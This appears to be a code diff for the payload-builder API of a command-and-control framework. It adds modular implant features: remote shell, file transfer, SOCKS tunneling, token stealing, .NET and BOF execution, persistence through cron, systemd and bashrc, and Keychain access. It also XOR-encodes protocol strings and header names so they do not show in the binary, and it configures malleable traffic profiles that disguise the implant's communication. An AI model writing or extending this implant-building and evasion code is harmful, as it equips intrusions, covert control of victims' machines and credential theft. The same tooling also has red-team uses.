@@ -21,6 +21,7 @@ import (
 	"time"
 
 	"c2/internal/builder"
+	wsbuilder "c2/internal/builder/websocket"
 	"c2/internal/common/config"
 	"c2/internal/websocket/agent"
 	"c2/internal/websocket/listeners"
@@ -60,6 +61,7 @@ type BuildPayloadRequest struct {
 	Arch           string       `json:"arch" binding:"required"`
 	Language       string       `json:"language"`
 	PayloadType    string       `json:"payload_type"`
+	Features       []string     `json:"features,omitempty"`
 	PipeName       string       `json:"pipe_name"`
 	SMBProfile     string       `json:"smb_profile"`
 	TCPProfile     string       `json:"tcp_profile"`
@@ -121,6 +123,17 @@ func (h *PayloadHandler) BuildPayload(c *gin.Context) {
 	if archLower != "amd64" && archLower != "arm64" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid arch, must be amd64 or arm64"})
 		return
+	}
+
+	// Validate features if provided
+	if len(req.Features) > 0 {
+		validFeatures := getValidFeatures(osLower)
+		for _, f := range req.Features {
+			if !validFeatures[f] {
+				c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("invalid feature '%s' for OS '%s'", f, osLower)})
+				return
+			}
+		}
 	}
 
 	// Default values
@@ -318,13 +331,16 @@ func (h *PayloadHandler) buildPayloadSync(ctx context.Context, req BuildPayloadR
 	}
 
 	// Load payload config
-	payloadConfig, httpRoutes, malleableConfig, err := h.loadPayloadConfig()
+	payloadConfig, _, _, err := h.loadPayloadConfig()
 	if err != nil {
 		return "", "", fmt.Errorf("failed to load config: %v", err)
 	}
 
 	// Prepare environment variables
-	envVars := h.prepareEnvVars(req, listener, clientID, secret, xorKey, keyPair, binaryName, payloadConfig, httpRoutes, malleableConfig)
+	envVars, err := h.prepareEnvVars(req, listener, clientID, secret, xorKey, keyPair, binaryName, payloadConfig)
+	if err != nil {
+		return "", "", fmt.Errorf("failed to prepare env vars: %v", err)
+	}
 
 	// Build the payload
 	result, err := h.builder.Build(ctx, &builder.BuildRequest{
@@ -375,7 +391,7 @@ func (h *PayloadHandler) loadPayloadConfig() (map[string]interface{}, map[string
 	return payloadConfig, httpRoutes, malleableConfig, nil
 }
 
-func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *listeners.Listener, clientID uuid.UUID, secret, xorKey string, keyPair *KeyPair, binaryName string, payloadConfig, httpRoutes, malleableConfig map[string]interface{}) []string {
+func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *listeners.Listener, clientID uuid.UUID, secret, xorKey string, keyPair *KeyPair, binaryName string, payloadConfig map[string]interface{}) ([]string, error) {
 	// Get config values with defaults
 	sleep := 20
 	jitter := 10
@@ -397,109 +413,80 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		}
 	}
 
-	// Get route configs
-	getRoute := "/api/v1/myget"
-	postRoute := "/api/v1/mypost"
+	// Extract GET handler details from listener's bound profile
+	if listener.GetProfile == "" {
+		return nil, fmt.Errorf("listener %q has no GET profile bound", listener.Name)
+	}
+	if h.agentConfig == nil {
+		return nil, fmt.Errorf("agent config not loaded")
+	}
+	getProfile := h.agentConfig.GetGetProfile(listener.GetProfile)
+	if getProfile == nil {
+		return nil, fmt.Errorf("GET profile %q not found", listener.GetProfile)
+	}
+	getRoute := getProfile.Path
 	getMethod := "GET"
+	if getProfile.Method != "" {
+		getMethod = getProfile.Method
+	}
+	var getClientIDName, getClientIDFormat string
+	for _, param := range getProfile.Params {
+		if param.Type == "clientID_param" {
+			getClientIDName = param.Name
+			getClientIDFormat = param.Format
+			break
+		}
+	}
+
+	// Extract POST handler details from listener's bound profile
+	if listener.PostProfile == "" {
+		return nil, fmt.Errorf("listener %q has no POST profile bound", listener.Name)
+	}
+	postProfile := h.agentConfig.GetPostProfile(listener.PostProfile)
+	if postProfile == nil {
+		return nil, fmt.Errorf("POST profile %q not found", listener.PostProfile)
+	}
+	postRoute := postProfile.Path
 	postMethod := "POST"
-	getClientIDName := "client"
-	getClientIDFormat := "%CLIENTID%"
-	postClientIDName := "client"
-	postClientIDFormat := "%CLIENTID%"
-	postSecretName := "id"
-	postSecretFormat := "%SECRET%"
-
-	// Parse GET handlers - TOML arrays decode as []interface{}
-	if gh, ok := httpRoutes["get_handlers"].([]interface{}); ok && len(gh) > 0 {
-		if handler, ok := gh[0].(map[string]interface{}); ok {
-			// Check if handler is enabled (default to true if not specified)
-			enabled := true
-			if e, ok := handler["enabled"].(bool); ok {
-				enabled = e
-			}
-			if enabled {
-				if p, ok := handler["path"].(string); ok {
-					getRoute = p
-				}
-				if m, ok := handler["method"].(string); ok {
-					getMethod = m
-				}
-				if params, ok := handler["params"].([]interface{}); ok && len(params) > 0 {
-					for _, p := range params {
-						if param, ok := p.(map[string]interface{}); ok {
-							paramType, _ := param["type"].(string)
-							if paramType == "clientID_param" {
-								if n, ok := param["name"].(string); ok {
-									getClientIDName = n
-								}
-								if f, ok := param["format"].(string); ok {
-									getClientIDFormat = f
-								}
-							}
-						}
-					}
-				}
-			}
+	if postProfile.Method != "" {
+		postMethod = postProfile.Method
+	}
+	var postClientIDName, postClientIDFormat string
+	var postSecretName, postSecretFormat string
+	for _, param := range postProfile.Params {
+		switch param.Type {
+		case "clientID_param":
+			postClientIDName = param.Name
+			postClientIDFormat = param.Format
+		case "secret_param":
+			postSecretName = param.Name
+			postSecretFormat = param.Format
 		}
 	}
 
-	// Parse POST handlers - TOML arrays decode as []interface{}
-	if ph, ok := httpRoutes["post_handlers"].([]interface{}); ok && len(ph) > 0 {
-		if handler, ok := ph[0].(map[string]interface{}); ok {
-			// Check if handler is enabled
-			enabled := true
-			if e, ok := handler["enabled"].(bool); ok {
-				enabled = e
-			}
-			if enabled {
-				if p, ok := handler["path"].(string); ok {
-					postRoute = p
-				}
-				if m, ok := handler["method"].(string); ok {
-					postMethod = m
-				}
-				if params, ok := handler["params"].([]interface{}); ok {
-					for _, p := range params {
-						if param, ok := p.(map[string]interface{}); ok {
-							paramType, _ := param["type"].(string)
-							if paramType == "clientID_param" {
-								if n, ok := param["name"].(string); ok {
-									postClientIDName = n
-								}
-								if f, ok := param["format"].(string); ok {
-									postClientIDFormat = f
-								}
-							} else if paramType == "secret_param" || strings.Contains(paramType, "secret") {
-								if n, ok := param["name"].(string); ok {
-									postSecretName = n
-								}
-								if f, ok := param["format"].(string); ok {
-									postSecretFormat = f
-								}
-							}
-						}
-					}
-				}
-			}
-		}
+	// Rekey config from listener's bound server response profile
+	if listener.ServerResponseProfile == "" {
+		return nil, fmt.Errorf("listener %q has no server response profile bound", listener.Name)
 	}
-
-	// Malleable config
+	respProfile := h.agentConfig.GetServerResponseProfile(listener.ServerResponseProfile)
+	if respProfile == nil {
+		return nil, fmt.Errorf("server response profile %q not found", listener.ServerResponseProfile)
+	}
 	rekeyCommand := "rekey"
 	rekeyStatusField := "status"
 	rekeyDataField := "data"
-	rekeyIDField := "id"
-	if r, ok := malleableConfig["rekey"].(string); ok {
-		rekeyCommand = r
+	rekeyIDField := "command_db_id"
+	if respProfile.RekeyValue != "" {
+		rekeyCommand = respProfile.RekeyValue
 	}
-	if r, ok := malleableConfig["rekey_status_field"].(string); ok {
-		rekeyStatusField = r
+	if respProfile.StatusField != "" {
+		rekeyStatusField = respProfile.StatusField
 	}
-	if r, ok := malleableConfig["rekey_data_field"].(string); ok {
-		rekeyDataField = r
+	if respProfile.DataField != "" {
+		rekeyDataField = respProfile.DataField
 	}
-	if r, ok := malleableConfig["rekey_id_field"].(string); ok {
-		rekeyIDField = r
+	if respProfile.CommandIDField != "" {
+		rekeyIDField = respProfile.CommandIDField
 	}
 
 	// Build custom headers JSON - read from config if available
@@ -542,6 +529,12 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		fmt.Sprintf("MALLEABLE_REKEY_DATA_FIELD=%s", rekeyDataField),
 		fmt.Sprintf("MALLEABLE_REKEY_ID_FIELD=%s", rekeyIDField),
 		fmt.Sprintf("PAYLOAD_TYPE=%s", req.PayloadType),
+	}
+
+	// Add features for modular builds (empty = all features, non-empty = selected only)
+	if len(req.Features) > 0 {
+		envVars = append(envVars, fmt.Sprintf("FEATURES=%s", strings.Join(req.Features, ",")))
+		log.Printf("[REST Builder] Modular build with features: %v", req.Features)
 	}
 
 	// Load unified link malleable config for payload injection (shared between SMB and TCP)
@@ -638,6 +631,104 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		fmt.Sprintf("POST_SECRET_FORMAT=%s", xorEncrypt(postSecretFormat, xorKey)),
 	)
 
+	// Generate transform configs from malleable profiles
+	var getClientIDTransforms, postClientIDTransforms, postDataTransforms, responseDataTransforms string
+	if listener.GetProfile != "" && h.agentConfig != nil {
+		if getProfile := h.agentConfig.GetGetProfile(listener.GetProfile); getProfile != nil {
+			if getProfile.ClientID != nil {
+				getClientIDTransforms = wsbuilder.SerializeDataBlockCompact(getProfile.ClientID)
+			}
+		}
+	}
+	if listener.PostProfile != "" && h.agentConfig != nil {
+		if postProfile := h.agentConfig.GetPostProfile(listener.PostProfile); postProfile != nil {
+			if postProfile.ClientID != nil {
+				postClientIDTransforms = wsbuilder.SerializeDataBlockCompact(postProfile.ClientID)
+			}
+			if postProfile.Data != nil {
+				postDataTransforms = wsbuilder.SerializeDataBlockCompact(postProfile.Data)
+			}
+		}
+	}
+	if listener.ServerResponseProfile != "" && h.agentConfig != nil {
+		if respProfile := h.agentConfig.GetServerResponseProfile(listener.ServerResponseProfile); respProfile != nil {
+			if respProfile.Data != nil {
+				responseDataTransforms = wsbuilder.SerializeDataBlockCompact(respProfile.Data)
+			}
+		}
+	}
+
+	padPreHeader := "X-Cache-Seq"
+	padAppHeader := "X-Cache-Idx"
+	if listener.PostProfile != "" && h.agentConfig != nil {
+		if pp := h.agentConfig.GetPostProfile(listener.PostProfile); pp != nil {
+			if pp.PadPreHeader != "" {
+				padPreHeader = pp.PadPreHeader
+			}
+			if pp.PadAppHeader != "" {
+				padAppHeader = pp.PadAppHeader
+			}
+		}
+	}
+
+	envVars = append(envVars,
+		fmt.Sprintf("GET_CLIENTID_TRANSFORMS=%s", xorEncrypt(getClientIDTransforms, xorKey)),
+		fmt.Sprintf("POST_CLIENTID_TRANSFORMS=%s", xorEncrypt(postClientIDTransforms, xorKey)),
+		fmt.Sprintf("POST_DATA_TRANSFORMS=%s", xorEncrypt(postDataTransforms, xorKey)),
+		fmt.Sprintf("RESPONSE_DATA_TRANSFORMS=%s", xorEncrypt(responseDataTransforms, xorKey)),
+	)
+
+	envVars = append(envVars,
+		fmt.Sprintf("PROTO_TYPE_HANDSHAKE=%s", xorEncrypt("handshake", xorKey)),
+		fmt.Sprintf("PROTO_TYPE_HS_RESP=%s", xorEncrypt("handshake_response", xorKey)),
+		fmt.Sprintf("PROTO_TYPE_PING=%s", xorEncrypt("ping", xorKey)),
+		fmt.Sprintf("PROTO_TYPE_PONG=%s", xorEncrypt("pong", xorKey)),
+		fmt.Sprintf("PROTO_TYPE_DATA=%s", xorEncrypt("data", xorKey)),
+		fmt.Sprintf("PROTO_TYPE_DISCONNECT=%s", xorEncrypt("disconnect", xorKey)),
+		fmt.Sprintf("PROTO_TYPE_LINK_HS=%s", xorEncrypt("link_handshake_response", xorKey)),
+		fmt.Sprintf("PROTO_KEY_TYPE=%s", xorEncrypt("type", xorKey)),
+		fmt.Sprintf("PROTO_KEY_PAYLOAD=%s", xorEncrypt("payload", xorKey)),
+		fmt.Sprintf("PROTO_KEY_AGENT_ID=%s", xorEncrypt("agent_id", xorKey)),
+		fmt.Sprintf("PROTO_KEY_RESULTS=%s", xorEncrypt("results", xorKey)),
+		fmt.Sprintf("PROTO_KEY_COMMANDS=%s", xorEncrypt("commands", xorKey)),
+		fmt.Sprintf("PROTO_KEY_SR=%s", xorEncrypt("sr", xorKey)),
+		fmt.Sprintf("PROTO_AUTH_PREFIX=%s", xorEncrypt("AUTH:", xorKey)),
+		fmt.Sprintf("PROTO_AUTH_OK=%s", xorEncrypt("OK", xorKey)),
+		fmt.Sprintf("PROTO_META_STARTUP=%s", xorEncrypt("startup_time", xorKey)),
+		fmt.Sprintf("PROTO_META_ACTIVE=%s", xorEncrypt("active", xorKey)),
+	)
+
+	envVars = append(envVars,
+		fmt.Sprintf("GE_METHOD_GET=%s", xorEncrypt("GET", xorKey)),
+		fmt.Sprintf("GE_METHOD_POST=%s", xorEncrypt("POST", xorKey)),
+		fmt.Sprintf("GE_PROTO_HTTPS=%s", xorEncrypt("https", xorKey)),
+		fmt.Sprintf("GE_PROTO_HTTP=%s", xorEncrypt("http", xorKey)),
+		fmt.Sprintf("GE_PORT_443=%s", xorEncrypt("443", xorKey)),
+		fmt.Sprintf("GE_PORT_80=%s", xorEncrypt("80", xorKey)),
+		fmt.Sprintf("GE_FMT_URL_NO_PORT=%s", xorEncrypt("%s://%s", xorKey)),
+		fmt.Sprintf("GE_FMT_URL_WITH_PORT=%s", xorEncrypt("%s://%s:%s", xorKey)),
+		fmt.Sprintf("GE_FMT_URL_QUERY=%s", xorEncrypt("%s%s?%s=%s", xorKey)),
+		fmt.Sprintf("GE_SLASH=%s", xorEncrypt("/", xorKey)),
+	)
+
+	envVars = append(envVars,
+		fmt.Sprintf("HTTP_HEADER_USER_AGENT=%s", xorEncrypt("User-Agent", xorKey)),
+		fmt.Sprintf("HTTP_HEADER_CONTENT_TYPE=%s", xorEncrypt("Content-Type", xorKey)),
+		fmt.Sprintf("HTTP_HEADER_PAD_PRE=%s", xorEncrypt(padPreHeader, xorKey)),
+		fmt.Sprintf("HTTP_HEADER_PAD_APP=%s", xorEncrypt(padAppHeader, xorKey)),
+		fmt.Sprintf("HTTP_META_ID=%s", xorEncrypt("id", xorKey)),
+		fmt.Sprintf("HTTP_META_ENCRYPTION=%s", xorEncrypt("encryption", xorKey)),
+		fmt.Sprintf("HTTP_ENC_RSA_AES=%s", xorEncrypt("rsa+aes", xorKey)),
+	)
+
+	jsonFields, err := wsbuilder.GenerateJSONFieldNames()
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate JSON field names: %v", err)
+	}
+	for fieldName, fieldValue := range jsonFields {
+		envVars = append(envVars, fmt.Sprintf("%s=%s", fieldName, xorEncrypt(fieldValue, xorKey)))
+	}
+
 	// Add safety checks (XOR encrypted to protect target identifiers)
 	if req.SafetyChecks.Hostname != "" {
 		envVars = append(envVars, fmt.Sprintf("SAFETY_HOSTNAME=%s", xorEncrypt(req.SafetyChecks.Hostname, xorKey)))
@@ -687,7 +778,7 @@ func (h *PayloadHandler) prepareEnvVars(req BuildPayloadRequest, listener *liste
 		envVars = append(envVars, fmt.Sprintf("PE_PRODUCT_VERSION=%s", req.PEProductVersion))
 	}
 
-	return envVars
+	return envVars, nil
 }
 
 
@@ -735,4 +826,50 @@ func xorEncrypt(plaintext, key string) string {
 		result[i] = plaintext[i] ^ key[i%len(key)]
 	}
 	return base64.StdEncoding.EncodeToString(result)
+}
+
+// Feature definitions for modular payload builds
+type FeatureInfo struct {
+	Name        string `json:"name"`
+	Description string `json:"description"`
+	OS          string `json:"os"`
+}
+
+var allFeatures = []FeatureInfo{
+	{Name: "shell", Description: "Shell command execution", OS: "all"},
+	{Name: "download", Description: "File download from target", OS: "all"},
+	{Name: "upload", Description: "File upload to target", OS: "all"},
+	{Name: "socks", Description: "SOCKS proxy tunneling", OS: "all"},
+	{Name: "link", Description: "Agent linking (SMB/TCP child agents)", OS: "all"},
+	{Name: "bof", Description: "Beacon Object File execution", OS: "windows"},
+	{Name: "assembly", Description: ".NET inline assembly execution", OS: "windows"},
+	{Name: "token", Description: "Token manipulation (make/steal/rev2self)", OS: "windows"},
+	{Name: "sudo", Description: "Sudo session management", OS: "linux,darwin"},
+	{Name: "persist", Description: "Persistence (systemd, cron, bashrc, launchd)", OS: "linux,darwin"},
+	{Name: "keychain", Description: "Keychain access", OS: "darwin"},
+}
+
+func getValidFeatures(osName string) map[string]bool {
+	valid := make(map[string]bool)
+	for _, f := range allFeatures {
+		if f.OS == "all" || strings.Contains(f.OS, osName) {
+			valid[f.Name] = true
+		}
+	}
+	return valid
+}
+
+// GetFeatures returns available features for a given OS
+// GET /api/v1/payloads/features?os=windows
+func (h *PayloadHandler) GetFeatures(c *gin.Context) {
+	osParam := strings.ToLower(c.DefaultQuery("os", ""))
+
+	var features []FeatureInfo
+	for _, f := range allFeatures {
+		if osParam == "" || f.OS == "all" || strings.Contains(f.OS, osParam) {
+			features = append(features, f)
+		}
+	}
+
+	c.JSON(http.StatusOK, gin.H{"features": features})
 }
